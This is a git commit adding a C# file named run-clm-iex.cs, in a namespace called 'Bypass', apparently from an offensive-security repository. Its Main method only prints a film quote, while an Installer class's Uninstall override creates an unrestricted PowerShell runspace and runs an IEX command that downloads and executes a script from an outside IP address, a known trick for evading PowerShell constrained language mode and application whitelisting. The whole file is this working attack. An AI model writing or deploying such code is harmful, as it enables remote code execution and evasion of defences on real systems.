84012f17bb8837206507d230a8a1e90ea9c4bffa
DockrManhattn <38168619+DockrManhattn@users.noreply.github.com>
2025-08-23 11:20:28 -0400

    Update run-clm-iex.cs

--- run-clm-iex.cs
+++ run-clm-iex.cs
@@ -1,1 +1,35 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
 
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("I’ve seen what such feelings can do to a fully trained Jedi Knight. To the best of us.");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://172.16.116.201/run.txt')";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+
+            ps.Invoke();
+
+            rs.Close();
+        }
+    }
+}
